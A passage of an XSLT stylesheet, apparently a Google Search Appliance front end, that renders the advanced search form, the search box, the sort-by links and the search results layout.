  {p[i++] = 'client=' + esc(z.client.value);}
if (typeof(z.site) != 'undefined') 
  {p[i++] = 'site=' + esc(z.site.value);}
if (typeof(z.output) != 'undefined') 
  {p[i++] = 'output=' + esc(z.output.value);}
if (typeof(z.proxystylesheet) != 'undefined') 
  {p[i++] = 'proxystylesheet=' + esc(z.proxystylesheet.value);}
if (typeof(z.ie) != 'undefined') 
  {p[i++] = 'ie=' + esc(z.ie.value);}
if (typeof(z.oe) != 'undefined') 
  {p[i++] = 'oe=' + esc(z.oe.value);}
if (typeof(z.restrict) != 'undefined') 
  {p[i++] = 'restrict=' + esc(z.restrict.value);}
if (typeof(z.access) != 'undefined') 
  {p[i++] = 'access=' + esc(z.access.value);}
if (custom != '')
  {p[i++] = 'proxycustom=' + '&lt;ADVANCED/&gt;';}
if (p.length &gt; 0) {
url = p[0];
for (var j = 1; j &lt; p.length; j++) { url += "&amp;" + p[j]; }}
 location.href = target + '?' + url;
}
// </xsl:comment>
</script>

  <xsl:call-template name="langHeadEnd"/>

  <body class="d" onload="setFocus()">

    <!-- *** Customer's own advanced search page header *** -->
    <xsl:if test="$choose_adv_search_page_header = 'mine' or
	  	  $choose_adv_search_page_header = 'both'">
      <xsl:call-template name="my_page_header"/>
    </xsl:if>

    <!--====Advanced Search Header======-->
    <xsl:if test="$choose_adv_search_page_header = 'provided' or
	  	  $choose_adv_search_page_header = 'both'">
      <xsl:call-template name="advanced_search_header"/>
    </xsl:if>

    <!--====Carry over Search Parameters======-->
    <form method="get" action="/search" name="f">
      <xsl:if test="PARAM[@name='client']">
        <input type="hidden" name="client" 
          value="{PARAM[@name='client']/@value}" />
      </xsl:if>
      <xsl:if test="PARAM[@name='site']">
        <input type="hidden" name="site" value="{PARAM[@name='site']/@value}"/>
      </xsl:if>
      <xsl:if test="PARAM[@name='output']">
        <input type="hidden" name="output" 
          value="{PARAM[@name='output']/@value}" />
      </xsl:if>
      <xsl:if test="PARAM[@name='proxystylesheet']">
        <input type="hidden" name="proxystylesheet" 
          value="{PARAM[@name='proxystylesheet']/@value}" />
      </xsl:if>
      <xsl:if test="PARAM[@name='ie']">
        <input type="hidden" name="ie" 
          value="{PARAM[@name='ie']/@value}" />
      </xsl:if>
      <xsl:if test="PARAM[@name='oe']">
        <input type="hidden" name="oe" 
          value="{PARAM[@name='oe']/@value}" />
      </xsl:if>
      <xsl:if test="PARAM[@name='restrict'] and 
	            $search_subcollections_xslt = ''">
        <input type="hidden" name="restrict" 
          value="{PARAM[@name='restrict']/@value}" />
      </xsl:if>

      <!--====Advanced Search Options======-->

      <table cellpadding="6" cellspacing="0" border="0" width="99%">
        <tr>
          <td><b>Advanced Web Search</b></td>
        </tr>
      </table>

      <table cellspacing="0" cellpadding="3" border="0" width="99%">
        <tr bgcolor="{$adv_search_panel_bgcolor}">
          <td>
            <table width="100%" cellspacing="0" cellpadding="0" border="0">
              <tr bgcolor="{$adv_search_panel_bgcolor}">
                <td>
                  <table width="100%" cellspacing="0" cellpadding="2" 
                  border="0">
                    <tr>
                      <td valign="top" width="15%"><font size="-1"><br />
                      <b>Find results</b></font> </td>

                      <td width="85%">
                        <table width="100%" cellpadding="2"
                        border="0" cellspacing="0">
                          <tr>
                            <td><font size="-1">with <b>all</b>
                            of the words</font></td>

                            <td>
                            <xsl:text disable-output-escaping="yes">
                             &lt;input type=&quot;text&quot; 
                             name=&quot;as_q&quot; 
                             size=&quot;25&quot; value=&quot;</xsl:text>
                            <xsl:value-of disable-output-escaping="yes" 
                             select="$html_escaped_as_q"/>
                            <xsl:text disable-output-escaping="yes">&quot;&gt;</xsl:text>

                            <script type="text/javascript">
                              <xsl:comment>
                                document.f.as_q.focus();
                              // </xsl:comment>
                            </script>
                            </td>

                            <td valign="top" rowspan="4">
                            <font size="-1">
                            <select name="num">
                              <xsl:choose>
                                <xsl:when test="PARAM[(@name='num') and (@value!='10')]">
                                  <option value="10">10 results</option>
                                </xsl:when>
                                <xsl:otherwise>
                                  <option value="10" selected="selected">10 results</option>
                                </xsl:otherwise>
                              </xsl:choose>
                              <xsl:choose>
                                <xsl:when test="PARAM[(@name='num') and (@value='20')]">
                                  <option value="20" selected="selected">20 results</option>
                                </xsl:when>
                                  <xsl:otherwise>
                                    <option value="20">20 results</option>
                                </xsl:otherwise>
                              </xsl:choose>
                              <xsl:choose>
                                <xsl:when test="PARAM[(@name='num') and (@value='30')]">
                                  <option value="30" selected="selected">30 results</option>
                                </xsl:when>
                                <xsl:otherwise>
                                  <option value="30">30 results</option>
                                </xsl:otherwise>
                              </xsl:choose>
                              <xsl:choose>
                                <xsl:when test="PARAM[(@name='num') and (@value='50')]">
                                  <option value="50" selected="selected">50 results</option>
                                </xsl:when>
                                <xsl:otherwise>
                                  <option value="50">50 results</option>
                                </xsl:otherwise>
                              </xsl:choose>
                              <xsl:choose>
                                <xsl:when test="PARAM[(@name='num') and (@value='100')]">
                                  <option value="100" selected="selected">100 results</option>
                                </xsl:when>
                                <xsl:otherwise>
                                  <option value="100">100 results</option>
                                </xsl:otherwise>
                              </xsl:choose>
                            </select>
                            </font>
			    </td>
                            <xsl:call-template name="subcollection_menu"/>
                            <td>
                            <font size="-1">
                            <input type="submit" name="btnG" 
                              value="{$search_button_text}" />
                            </font>
                            </td>
                          </tr>

                          <tr>
                            <td nowrap="nowrap"><font size="-1">with the
                            <b>exact phrase</b></font></td>

                            <td>
	                    <xsl:text disable-output-escaping="yes">
                             &lt;input type=&quot;text&quot; 
                             name=&quot;as_epq&quot; 
                             size=&quot;25&quot; value=&quot;</xsl:text>
                            <xsl:value-of disable-output-escaping="yes" 
                             select="$html_escaped_as_epq"/>
                            <xsl:text disable-output-escaping="yes">&quot;&gt;</xsl:text>
                            </td>
                          </tr>

                          <tr>
                            <td nowrap="nowrap"><font size="-1">with <b>any</b>
                            of the words</font></td>

                            <td>
	                    <xsl:text disable-output-escaping="yes">
                             &lt;input type=&quot;text&quot; 
                             name=&quot;as_oq&quot; 
                             size=&quot;25&quot; value=&quot;</xsl:text>
                            <xsl:value-of disable-output-escaping="yes" 
                             select="$html_escaped_as_oq"/>
                            <xsl:text disable-output-escaping="yes">&quot;&gt;</xsl:text>
                            </td>
                          </tr>

                          <tr>
                            <td nowrap="nowrap"><font size="-1"><b>without</b>
                            the words</font></td>

                            <td>
	                    <xsl:text disable-output-escaping="yes">
                             &lt;input type=&quot;text&quot; 
                             name=&quot;as_eq&quot; 
                             size=&quot;25&quot; value=&quot;</xsl:text>
                            <xsl:value-of disable-output-escaping="yes" 
                             select="$html_escaped_as_eq"/>
                            <xsl:text disable-output-escaping="yes">&quot;&gt;</xsl:text>
                            </td>
                          </tr>
                        </table>
                      </td>
                    </tr>
                  </table>
                </td>
              </tr>

              <tr bgcolor="{$global_bg_color}">
                <td>
                  <table width="100%" cellspacing="0"
                  cellpadding="2" border="0">
                    <tr>
                      <td width="15%"><font size="-1"><b>Language</b></font></td>

                      <td width="40%"><font size="-1">Return pages written
                      in</font></td>
		
		      <td><font size="-1">
                      
   	              <xsl:choose>
			<xsl:when test="PARAM[(@name='oe') and (@value!='')]"> 
                          <xsl:text disable-output-escaping="yes">&lt;select name=&quot;lr&quot;&gt;</xsl:text>
                        </xsl:when>
                        <xsl:otherwise>
                          <xsl:text disable-output-escaping="yes">&lt;select name=&quot;lr&quot; onchange=&quot;javascript:collecturl('/search', 'adv');&quot;&gt;</xsl:text>
                        </xsl:otherwise>
                      </xsl:choose>

                        <option value="">any language</option>

                        <xsl:choose>
                          <xsl:when test="PARAM[(@name='lr') and (@value='lang_zh-CN')]">
                            <option value="lang_zh-CN" 
                              selected="selected">Chinese (Simplified)</option>
                          </xsl:when>
                          <xsl:otherwise>
                            <option value="lang_zh-CN">Chinese (Simplified)</option>
                          </xsl:otherwise>
                        </xsl:choose>

                        <xsl:choose>
                          <xsl:when test="PARAM[(@name='lr') and (@value='lang_zh-TW')]">
                            <option value="lang_zh-TW" 
                              selected="selected">Chinese (Traditional)</option>
                          </xsl:when>
                          <xsl:otherwise>
                            <option value="lang_zh-TW">Chinese (Traditional)</option>
                          </xsl:otherwise>
                        </xsl:choose>

                        <xsl:choose>
                          <xsl:when test="PARAM[(@name='lr') and (@value='lang_cs')]">
                            <option value="lang_cs" selected="selected">Czech</option>
                          </xsl:when>
                          <xsl:otherwise>
                            <option value="lang_cs">Czech</option>
                          </xsl:otherwise>
                        </xsl:choose>

                        <xsl:choose>
                          <xsl:when test="PARAM[(@name='lr') and (@value='lang_da')]">
                            <option value="lang_da" selected="selected">Danish</option>
                          </xsl:when>
                          <xsl:otherwise>
                            <option value="lang_da">Danish</option>
                          </xsl:otherwise>
                        </xsl:choose>

                        <xsl:choose>
                          <xsl:when test="PARAM[(@name='lr') and (@value='lang_nl')]">
                            <option value="lang_nl" selected="selected">Dutch</option>
                          </xsl:when>
                          <xsl:otherwise>
                            <option value="lang_nl">Dutch</option>
                          </xsl:otherwise>
                        </xsl:choose>

                        <xsl:choose>
                          <xsl:when test="PARAM[(@name='lr') and (@value='lang_en')]">
                            <option value="lang_en" selected="selected">English</option>
                          </xsl:when>
                          <xsl:otherwise>
                            <option value="lang_en">English</option>
                          </xsl:otherwise>
                        </xsl:choose>

                        <xsl:choose>
                          <xsl:when test="PARAM[(@name='lr') and (@value='lang_et')]">
                            <option value="lang_et" selected="selected">Estonian</option>
                          </xsl:when>
                          <xsl:otherwise>
                            <option value="lang_et">Estonian</option>
                          </xsl:otherwise>
                        </xsl:choose>

                        <xsl:choose>
                          <xsl:when test="PARAM[(@name='lr') and (@value='lang_fi')]">
                            <option value="lang_fi" selected="selected">Finnish</option>
                          </xsl:when>
                          <xsl:otherwise>
                            <option value="lang_fi">Finnish</option>
                          </xsl:otherwise>
                        </xsl:choose>

                         <xsl:choose>
                          <xsl:when test="PARAM[(@name='lr') and (@value='lang_fr')]">
                            <option value="lang_fr" selected="selected">French</option>
                          </xsl:when>
                          <xsl:otherwise>
                            <option value="lang_fr">French</option>
                          </xsl:otherwise>
                        </xsl:choose>

                        <xsl:choose>
                          <xsl:when test="PARAM[(@name='lr') and (@value='lang_de')]">
                            <option value="lang_de" selected="selected">German</option>
                          </xsl:when>
                          <xsl:otherwise>
                            <option value="lang_de">German</option>
                          </xsl:otherwise>
                        </xsl:choose>

                        <xsl:choose>
                          <xsl:when test="PARAM[(@name='lr') and (@value='lang_el')]">
                            <option value="lang_el" selected="selected">Greek</option>
                          </xsl:when>
                          <xsl:otherwise>
                            <option value="lang_el">Greek</option>
                          </xsl:otherwise>
                        </xsl:choose>

                         <xsl:choose>
                          <xsl:when test="PARAM[(@name='lr') and (@value='lang_iw')]">
                            <option value="lang_iw" selected="selected">Hebrew</option>
                          </xsl:when>
                          <xsl:otherwise>
                            <option value="lang_iw">Hebrew</option>
                          </xsl:otherwise>
                        </xsl:choose>

                        <xsl:choose>
                          <xsl:when test="PARAM[(@name='lr') and (@value='lang_hu')]">
                            <option value="lang_hu" selected="selected">Hungarian</option>
                          </xsl:when>
                          <xsl:otherwise>
                            <option value="lang_hu">Hungarian</option>
                          </xsl:otherwise>
                        </xsl:choose>

                        <xsl:choose>
                          <xsl:when test="PARAM[(@name='lr') and (@value='lang_is')]">
                            <option value="lang_is" selected="selected">Icelandic</option>
                          </xsl:when>
                          <xsl:otherwise>
                            <option value="lang_is">Icelandic</option>
                          </xsl:otherwise>
                        </xsl:choose>

                        <xsl:choose>
                          <xsl:when test="PARAM[(@name='lr') and (@value='lang_it')]">
                            <option value="lang_it" selected="selected">Italian</option>
                          </xsl:when>
                          <xsl:otherwise>
                            <option value="lang_it">Italian</option>
                          </xsl:otherwise>
                        </xsl:choose>

                        <xsl:choose>
                          <xsl:when test="PARAM[(@name='lr') and (@value='lang_ja')]">
                            <option value="lang_ja" selected="selected">Japanese</option>
                          </xsl:when>
                          <xsl:otherwise>
                            <option value="lang_ja">Japanese</option>
                          </xsl:otherwise>
                        </xsl:choose>

                        <xsl:choose>
                          <xsl:when test="PARAM[(@name='lr') and (@value='lang_ko')]">
                            <option value="lang_ko" selected="selected">Korean</option>
                          </xsl:when>
                          <xsl:otherwise>
                            <option value="lang_ko">Korean</option>
                          </xsl:otherwise>
                        </xsl:choose>

                        <xsl:choose>
                          <xsl:when test="PARAM[(@name='lr') and (@value='lang_lv')]">
                            <option value="lang_lv" selected="selected">Latvian</option>
                          </xsl:when>
                          <xsl:otherwise>
                            <option value="lang_lv">Latvian</option>
                          </xsl:otherwise>
                        </xsl:choose>

                        <xsl:choose>
                          <xsl:when test="PARAM[(@name='lr') and (@value='lang_lt')]">
                            <option value="lang_lt" selected="selected">Lithuanian</option>
                          </xsl:when>
                          <xsl:otherwise>
                            <option value="lang_lt">Lithuanian</option>
                          </xsl:otherwise>
                        </xsl:choose>

                        <xsl:choose>
                          <xsl:when test="PARAM[(@name='lr') and (@value='lang_no')]">
                            <option value="lang_no" selected="selected">Norwegian</option>
                          </xsl:when>
                          <xsl:otherwise>
                            <option value="lang_no">Norwegian</option>
                          </xsl:otherwise>
                        </xsl:choose>

                        <xsl:choose>
                          <xsl:when test="PARAM[(@name='lr') and (@value='lang_pl')]">
                            <option value="lang_pl" selected="selected">Polish</option>
                          </xsl:when>
                          <xsl:otherwise>
                            <option value="lang_pl">Polish</option>
                          </xsl:otherwise>
                        </xsl:choose>

                        <xsl:choose>
                          <xsl:when test="PARAM[(@name='lr') and (@value='lang_pt')]">
                            <option value="lang_pt" selected="selected">Portuguese</option>
                          </xsl:when>
                          <xsl:otherwise>
                            <option value="lang_pt">Portuguese</option>
                          </xsl:otherwise>
                        </xsl:choose>

                        <xsl:choose>
                          <xsl:when test="PARAM[(@name='lr') and (@value='lang_ro')]">
                            <option value="lang_ro" selected="selected">Romanian</option>
                          </xsl:when>
                          <xsl:otherwise>
                            <option value="lang_ro">Romanian</option>
                          </xsl:otherwise>
                        </xsl:choose>

                        <xsl:choose>
                          <xsl:when test="PARAM[(@name='lr') and (@value='lang_ru')]">
                            <option value="lang_ru" selected="selected">Russian</option>
                          </xsl:when>
                          <xsl:otherwise>
                            <option value="lang_ru">Russian</option>
                          </xsl:otherwise>
                        </xsl:choose>

                        <xsl:choose>
                          <xsl:when test="PARAM[(@name='lr') and (@value='lang_es')]">
                            <option value="lang_es" selected="selected">Spanish</option>
                          </xsl:when>
                          <xsl:otherwise>
                            <option value="lang_es">Spanish</option>
                          </xsl:otherwise>
                        </xsl:choose>

                         <xsl:choose>
                          <xsl:when test="PARAM[(@name='lr') and (@value='lang_sv')]">
                            <option value="lang_sv" selected="selected">Swedish</option>
                          </xsl:when>
                          <xsl:otherwise>
                            <option value="lang_sv">Swedish</option>
                          </xsl:otherwise>
                        </xsl:choose>
                      <xsl:text disable-output-escaping="yes">&lt;/select&gt;</xsl:text>
		      </font></td>
                    </tr>
                  </table>
                </td>
              </tr>

              <tr bgcolor="{$global_bg_color}">
                <td>
                  <table width="100%" cellspacing="0"
                  cellpadding="2" border="0">
                    <tr>
                      <td width="15%"><font size="-1"><b>Occurrences</b></font></td>

                      <td nowrap="nowrap" width="40%"><font size="-1">Return
                      results where my terms occur</font></td>

                      <td><font size="-1"><select
                      name="as_occt">
                        <xsl:choose>
                          <xsl:when test="PARAM[(@name='as_occt') and (@value!='any')]">
                            <option value="any"> anywhere in the page </option>
                          </xsl:when>
                          <xsl:otherwise>
                            <option value="any" selected="selected">
                              anywhere in the page
                            </option>
                          </xsl:otherwise>
                        </xsl:choose>
                        <xsl:choose>
                          <xsl:when test="PARAM[(@name='as_occt') and (@value='title')]">
                            <option value="title" selected="selected">in the title of the page</option>
                          </xsl:when>
                          <xsl:otherwise>
                            <option value="title">in the title of the page</option>
                          </xsl:otherwise>
                        </xsl:choose>
                        <xsl:choose>
                          <xsl:when test="PARAM[(@name='as_occt') and (@value='url')]">
                            <option value="url" selected="selected">in the url of the page</option>
                          </xsl:when>
                          <xsl:otherwise>
                            <option value="url">in the url of the page</option>
                          </xsl:otherwise>
                        </xsl:choose>
                      </select></font></td>
                    </tr>
                  </table>
                </td>
              </tr>

              <tr bgcolor="{$global_bg_color}">
                <td>
                  <table width="100%" cellpadding="2"
                  cellspacing="0" border="0">
                    <tr>
                      <td width="15%"><font size="-1"><b>Domains</b></font></td>

                      <td width="40%" nowrap="nowrap"><font size="-1"><select
                      name="as_dt">
                        <xsl:choose>
                          <xsl:when test="PARAM[(@name='as_dt') and (@value='i')]">
                            <option value="i" selected="selected">Only</option>
                          </xsl:when>
                          <xsl:otherwise>
                            <option value="i">Only</option>
                          </xsl:otherwise>
                        </xsl:choose>
                        <xsl:choose>
                          <xsl:when test="PARAM[(@name='as_dt') and (@value='e')]">
                            <option value="e" selected="selected">Don't</option>
                          </xsl:when>
                          <xsl:otherwise>
                            <option value="e">Don't</option>
                          </xsl:otherwise>
                        </xsl:choose>
                      </select>return results from the site or domain</font></td>

                      <td>
                        <table cellpadding="0" cellspacing="0"
                        border="0">
                          <tr>
                            <td>
                              <xsl:choose>
                                <xsl:when test="PARAM[@name='as_sitesearch']">
                                  <input type="text" size="25" 
                                  value="{PARAM[@name='as_sitesearch']/@value}" 
                                  name="as_sitesearch" />
                                </xsl:when>
                                <xsl:otherwise>
                                  <input type="text" size="25" value="" name="as_sitesearch" />
                                </xsl:otherwise>
                              </xsl:choose>
                            </td>
                          </tr>

                          <tr>
                            <td valign="top" nowrap="nowrap"><font size="-1">
                              <i>e.g. google.com, .org</i></font></td>
                          </tr>
                        </table>
                      </td>
                    </tr>

                    <!-- Sort by Date feature -->
		    <tr>
                      <td width="15%"><font size="-1"><b>Sort</b></font></td>

                      <td width="40%" nowrap="nowrap"><font size="-1"><select
                      name="sort">
                        <xsl:choose>
                          <xsl:when test="PARAM[(@name='sort') and (@value='')]">
                            <option value="" selected="selected">by Relevance</option>
                          </xsl:when>
                          <xsl:otherwise>
                            <option value="">by Relevance</option>
                          </xsl:otherwise>
                        </xsl:choose>
                        <xsl:choose>
                          <xsl:when test="PARAM[(@name='sort') and (@value='date:D:S:d1')]">
                            <option value="date:D:S:d1" selected="selected">by Date</option>
                          </xsl:when>
                          <xsl:otherwise>
                            <option value="date:D:S:d1">by Date</option>
                          </xsl:otherwise>
                        </xsl:choose>
                      </select></font></td>
                    </tr>
                    <!-- Secure Search feature -->
                    <xsl:if test="$show_secure_radio != '0'"> 
		    <tr>
                      <td width="15%"><font size="-1"><b>Security</b></font></td>

                      <td width="40%" nowrap="nowrap"><font size="-1">
                        <xsl:choose>
                          <xsl:when test="$access='p'">
                            <input type="radio" name="access" value="p" checked="checked" />Search public content only
                          </xsl:when>
                        <xsl:otherwise>
                          <input type="radio" name="access" value="p"/>Search public content only
                        </xsl:otherwise>
                        </xsl:choose>
                        <xsl:choose>
                          <xsl:when test="$access='a'">
                            <input type="radio" name="access" value="a" checked="checked" />Search public and secure content (login required)
                          </xsl:when>
                        <xsl:otherwise>
                          <input type="radio" name="access" value="a"/>Search public and secure content (login required)
                        </xsl:otherwise>
                        </xsl:choose>
                      </font></td>
                    </tr>
                    </xsl:if>
                  </table>
                </td>
              </tr>

            </table>
          </td>
        </tr>
      </table>
      <br />
      <br />

      <!--====Page-Specific Search======-->
      <table cellpadding="6" cellspacing="0" border="0">
        <tr>
          <td><b>Page-Specific Search</b></td>
        </tr>
      </table>

      <table cellspacing="0" cellpadding="3" border="0"
      width="99%">
        <tr bgcolor="{$adv_search_panel_bgcolor}">
          <td>
            <table width="100%" cellpadding="0" cellspacing="0"
            border="0">
              <tr bgcolor="{$adv_search_panel_bgcolor}">
                <td>

                  <table width="100%" cellpadding="2"
                  cellspacing="0" border="0">
                  <form method="get" action="/search" name="h">

                    <tr bgcolor="{$global_bg_color}">
                      <td width="15%"><font size="-1"><b>Links</b></font></td>

                      <td width="40%" nowrap="nowrap"><font size="-1">Find pages
                      that link to the page</font> </td>

                      <td nowrap="nowrap">
                          <xsl:choose>
                            <xsl:when test="PARAM[@name='as_lq']">
                              <input type="text" size="30" 
                               value="{PARAM[@name='as_lq']/@value}" 
                                       name="as_lq" />
                          </xsl:when>
                          <xsl:otherwise>
                            <input type="text" size="30" value="" name="as_lq" />
                          </xsl:otherwise>
                        </xsl:choose>
                        <font size="-1">
                        <input type="submit" name="btnG" value="{$search_button_text}" /></font>
                      </td>
                    </tr>
                  </form>
                  </table>
                </td>
              </tr>
            </table>
          </td>
        </tr>
      </table>

      <xsl:call-template name="copyright"/>

    </form>

    <!-- *** Customer's own advanced search page footer *** -->
    <xsl:call-template name="my_page_footer"/>

  </body>
</html>
</xsl:template>


<!-- **********************************************************************
 Resend query with filter=p to disable path_filtering 
 if there is only one result cluster (do not customize)
     ********************************************************************** -->
<xsl:template name="redirect_if_few_results">
  <xsl:variable name="count" select="count(/GSP/RES/R)"/> 
  <xsl:variable name="start" select="/GSP/RES/@SN"/> 
  <xsl:variable name="filterall" 
    select="count(/GSP/PARAM[@name='filter']) = 0"/> 
  <xsl:variable name="filter" select="/GSP/PARAM[@name='filter']/@value"/> 
 
  <xsl:if test="$count = 2 and $start = 1 and ($filterall or $filter = '1')">
      <meta HTTP-EQUIV="REFRESH" content="0;url={$filter_url}p"/>
  </xsl:if>
</xsl:template>


<!-- **********************************************************************
 Search results (do not customize)
     ********************************************************************** -->
<xsl:template name="search_results">
<html>

  <!-- *** HTML header and style *** -->
  <xsl:call-template name="langHeadStart"/>
    <xsl:call-template name="redirect_if_few_results"/>
    <title><xsl:value-of select="$result_page_title"/>: <xsl:value-of 
      disable-output-escaping="yes" select="$html_escaped_query"/>
    </title>
    <xsl:call-template name="style"/>
    <script type="text/javascript">
      <xsl:comment>
        function resetForms() {
          for (var i = 0; i &lt; document.forms.length; i++ ) { 
              document.forms[i].reset();
          }
        }
      //</xsl:comment>
    </script>
  <xsl:call-template name="langHeadEnd"/>

  <body onLoad="resetForms()">

  <!-- *** Customer's own result page header *** -->
  <xsl:if test="$choose_result_page_header = 'mine' or
		$choose_result_page_header = 'both'">
    <xsl:call-template name="my_page_header"/>
  </xsl:if>

  <!-- *** Result page header *** -->
  <xsl:if test="$choose_result_page_header = 'provided' or
		$choose_result_page_header = 'both'">
    <xsl:call-template name="result_page_header" />
  </xsl:if>

  <!-- *** Top separation bar *** -->
    <xsl:if test="Q != ''">
      <xsl:call-template name="top_sep_bar">
        <xsl:with-param name="query" select="Q"/>
        <xsl:with-param name="time" select="TM"/>
      </xsl:call-template>
    </xsl:if>

    <xsl:if test="$choose_sep_bar = 'line'">
      <hr size="1" color="gray"/>
    </xsl:if>

    <!-- *** Handle results (if any) *** -->
    <xsl:choose>
      <xsl:when test="RES or GM or Spelling or Synonyms or CT">
        <xsl:call-template name="results">
          <xsl:with-param name="query" select="Q"/>
          <xsl:with-param name="time" select="TM"/>
        </xsl:call-template>
      </xsl:when>
      <xsl:when test="Q=''">
      </xsl:when>
      <xsl:otherwise>
        <xsl:call-template name="no_RES">
          <xsl:with-param name="query" select="Q"/>
        </xsl:call-template>
      </xsl:otherwise>
    </xsl:choose>

    <!-- *** Google footer *** -->
    <xsl:call-template name="copyright"/>

    <!-- *** Customer's own result page footer *** -->
    <xsl:call-template name="my_page_footer"/>

  <!-- *** HTML footer *** -->
  </body>
</html>

</xsl:template>


<!-- ********************************************************************** 
  Subcollection menu beside the search box 
     ********************************************************************** -->
<xsl:template name="subcollection_menu">
  <xsl:if test="$search_subcollections_xslt != ''">
    <td valign="middle">
      <select name="restrict">
        <xsl:choose>
          <xsl:when test="PARAM[(@name='restrict') and (@value!='')]">
            <option value="">All documents</option>
          </xsl:when>
          <xsl:otherwise>
            <option value="" selected="selected">All documents</option>
          </xsl:otherwise>
        </xsl:choose>
        
      </select>
    </td>
  </xsl:if>
</xsl:template>

<!-- ********************************************************************** 
  Search box input form 
     ********************************************************************** -->
<xsl:template name="search_box">
  <form name="gs" method="GET" action="/search">
      <table cellpadding="0" cellspacing="0">
        <tr>
          <td valign="middle">
          <font size="-1">
            <xsl:text disable-output-escaping="yes">
              &lt;input type=&quot;text&quot; name=&quot;q&quot; 
              size=&quot;</xsl:text>
            <xsl:value-of select="$search_box_size"/>
            <xsl:text disable-output-escaping="yes"
              >&quot; maxlength=&quot;256&quot; value=&quot;</xsl:text>
            <xsl:value-of disable-output-escaping="yes" 
    	      select="$html_escaped_query"/>
            <xsl:text disable-output-escaping="yes">&quot;&gt;</xsl:text>
          </font>
          </td>
          <xsl:call-template name="subcollection_menu"/>
          <td valign="middle">
          <font size="-1">
            <xsl:call-template name="nbsp"/>
              <xsl:choose>
              <xsl:when test="$choose_search_button = 'image'">
	        <input type="image" name="btnG" src="{$search_button_image_url}" 
                       valign="bottom" width="60" height="26" 
                       border="0" value="{$search_button_text}"/>
              </xsl:when>     
              <xsl:otherwise>
                <input type="submit" name="btnG" value="{$search_button_text}"/>
              </xsl:otherwise>
              </xsl:choose>
          </font>
          </td>
        </tr>
        <xsl:if test="$show_secure_radio != '0'"> 
        <tr>
          <td colspan="2">
          <font size="-1">Search:
            <xsl:choose>
              <xsl:when test="$access='p'">
                <input type="radio" name="access" value="p" checked="checked" />public content
              </xsl:when>
              <xsl:otherwise>
                <input type="radio" name="access" value="p"/>public content
              </xsl:otherwise>
            </xsl:choose>
            <xsl:choose>
              <xsl:when test="$access='a'">
                <input type="radio" name="access" value="a" checked="checked" />public and secure content
              </xsl:when>
              <xsl:otherwise>
                <input type="radio" name="access" value="a"/>public and secure content
              </xsl:otherwise>
            </xsl:choose>
          </font>
          </td>
        </tr>
        </xsl:if>
      </table>
    <xsl:text>
    </xsl:text>
    <xsl:call-template name="form_params"/>
  </form>
</xsl:template>


<!-- ********************************************************************** 
  Bottom search box (do not customized)
     ********************************************************************** -->
<xsl:template name="bottom_search_box">
    <br clear="all"/>
    <br/>
    <center>
    <table border="0" cellpadding="2" cellspacing="0">
      <tr>
        <td nowrap="1">
          <xsl:call-template name="search_box"/>
        </td>
      </tr>
    </table>
    </center>
</xsl:template>


<!-- **********************************************************************
 Sort-by criteria: sort by date/relevance
     ********************************************************************** -->
<xsl:template name="sort_by">
  <xsl:variable name="sort_by_relevance_url"><xsl:for-each 
    select="/GSP/PARAM[(@name != 'sort') and
		       (@name != 'start')]">
      <xsl:value-of select="@name"/><xsl:text>=</xsl:text>
      <xsl:value-of select="@original_value"/>
      <xsl:if test="position() != last()">
        <xsl:text disable-output-escaping="yes">&amp;</xsl:text>
      </xsl:if>
    </xsl:for-each>
  </xsl:variable>
  <xsl:variable name="sort_by_date_url">
    <xsl:value-of select="$search_url"
      />&amp;sort=date%3AD%3AS%3Ad1</xsl:variable>

  <table><tr valign='top'><td>
  <span class="s">
  <font color="{$global_text_color}">
    <xsl:text>Sort by: </xsl:text>
  </font>
  <xsl:choose>
    <xsl:when test="/GSP/PARAM[@name = 'sort' and starts-with(@value,'date')]">
      <font color="{$global_text_color}">
      <xsl:text>Date / </xsl:text>
      </font>
      <a href="/search?{$sort_by_relevance_url}">Relevance</a>
    </xsl:when>
    <xsl:otherwise>
      <a href="/search?{$sort_by_date_url}">Date</a>
      <font color="{$global_text_color}">
      <xsl:text> / Relevance</xsl:text>
      </font>
    </xsl:otherwise>
  </xsl:choose>
  </span>
  </td></tr></table>
</xsl:template>

<!-- **********************************************************************
 Output all results 
     ********************************************************************** -->
<xsl:template name="results">
  <xsl:param name="query"/>
  <xsl:param name="time"/>

  <!-- *** Add top navigation/sort-by bar *** -->
  <table width="100%">
  <tr>
    <xsl:if test="$show_top_navigation != '0'">
      <td align="left">
        <xsl:call-template name="google_navigation">
          <xsl:with-param name="prev" select="RES/NB/PU"/>
          <xsl:with-param name="next" select="RES/NB/NU"/>
          <xsl:with-param name="view_begin" select="RES/@SN"/>
          <xsl:with-param name="view_end" select="RES/@EN"/>
          <xsl:with-param name="guess" select="RES/M"/>
          <xsl:with-param name="navigation_style" select="'top'"/>
        </xsl:call-template>
      </td>
    </xsl:if>
    <xsl:if test="$show_sort_by != '0'">
    <td align="right">
      <xsl:call-template name="sort_by"/>
    </td>
    </xsl:if>
  </tr>
  </table>

  <!-- *** Handle spelling suggestions, if any *** -->
    <xsl:if test="$show_spelling != '0'">
      <xsl:call-template name="spelling"/>
    </xsl:if>

  <!-- *** Handle synonyms, if any *** -->
    <xsl:if test="$show_synonyms != '0'">
      <xsl:call-template name="synonyms"/>
    </xsl:if>

  <!-- *** Output results details *** -->
    <div>
    <!-- for keymatch results -->
    <xsl:if test="$show_keymatch != '0'">
      <xsl:apply-templates select="/GSP/GM"/>  
    </xsl:if>
 
    <!-- for real results -->
    <xsl:apply-templates select="RES/R">
      <xsl:with-param name="query" select="$query"/>
    </xsl:apply-templates>

  <!-- *** Filter note (if needed) *** -->
    <xsl:if test="(RES/FI) and (not(RES/NB/NU))">
      <p>
        <i>
        In order to show you the most relevant results, we have omitted 
        some entries very similar to the <xsl:value-of select="RES/@EN"/>
        already displayed.
        <br/>If you like, you can <a href="{$filter_url}0">
          repeat the search with the omitted results included</a>.
        </i>
      </p>
    </xsl:if>
    </div>

  <!-- *** Add bottom navigation *** -->
    <xsl:variable name="nav_style">
      <xsl:choose>
        <xsl:when test="($access='s') or ($access='a')">simple</xsl:when>
        <xsl:otherwise>
          <xsl:value-of select="$choose_bottom_navigation"/>
        </xsl:otherwise>
      </xsl:choose>
    </xsl:variable>

    <xsl:call-template name="google_navigation">
      <xsl:with-param name="prev" select="RES/NB/PU"/>
      <xsl:with-param name="next" select="RES/NB/NU"/>
      <xsl:with-param name="view_begin" select="RES/@SN"/>
      <xsl:with-param name="view_end" select="RES/@EN"/>
      <xsl:with-param name="guess" select="RES/M"/>
      <xsl:with-param name="navigation_style" select="$nav_style"/>
    </xsl:call-template>

  <!-- *** Bottom search box *** -->
